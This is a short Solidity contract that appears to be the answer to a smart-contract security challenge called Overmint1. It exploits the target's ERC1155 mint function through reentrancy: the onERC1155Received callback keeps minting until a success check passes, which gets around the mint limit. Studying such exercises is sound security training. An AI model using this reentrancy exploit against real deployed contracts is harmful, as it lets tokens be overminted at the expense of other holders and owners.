// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint1-ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract Solution is IERC1155Receiver {
    Overmint1_ERC1155 overmint;

    constructor(Overmint1_ERC1155 _overmint) {
        overmint = _overmint;
    }

    function solve() external {
        // mint an NFT first of any ID
        overmint.mint(1, "");
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external override returns (bytes4) {
        // mint again if overmint is not successful
        if (!overmint.success(address(this), 1)) overmint.mint(1, "");

        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external override returns (bytes4) {}

    function supportsInterface(bytes4 interfaceId)
        external
        view
        returns (bool)
    {}
}